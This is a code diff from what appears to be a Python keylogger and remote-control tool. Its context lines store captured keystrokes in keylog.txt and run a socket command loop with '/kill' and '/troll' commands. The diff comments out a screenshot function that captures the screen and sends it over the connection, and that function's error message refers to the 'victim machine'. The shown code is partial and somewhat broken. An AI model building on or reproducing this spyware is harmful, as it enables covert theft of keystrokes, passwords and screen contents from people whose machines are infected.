@@ -34,11 +34,17 @@ def functionPK(key):
     keys.append(key)
     storeKeysToFile(keys)
 
-def screenshot():
-    arquive = ImageGrab.grab().save("screenshot.jpg", "JPEG")
-    with open(arquive, 'rb') as arq:
-        data_arquive = arq.read()
-        conn.send(data_arquive.encode('utf-8'))
+#def screenshot():
+#    arquive = ImageGrab.grab().save("screenshot.png", "PNG")
+#    filename = "screenshot.png"
+#    conn.send(filename.encode("utf-8"))
+#    file = open(arquive, 'rb')
+#    with open(file, 'rb') as img:
+#        data = img.read(1024)
+#        if not data:
+#            conn.send("error to take or send a picture in victim machine!".encode("utf-8"))
+#        conn.sendall(data)
+    
 
 def storeKeysToFile(keys):   
     with open('keylog.txt', 'w') as log:  
@@ -99,8 +105,8 @@ while True:
         break
     if cmd == "/kill":
         kill()
-    if cmd == "/screenlog":
-        screenshot()
+    #if cmd == "/screenlog":
+    #    screenshot()
     if cmd == "/troll":
         link = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
         while True:
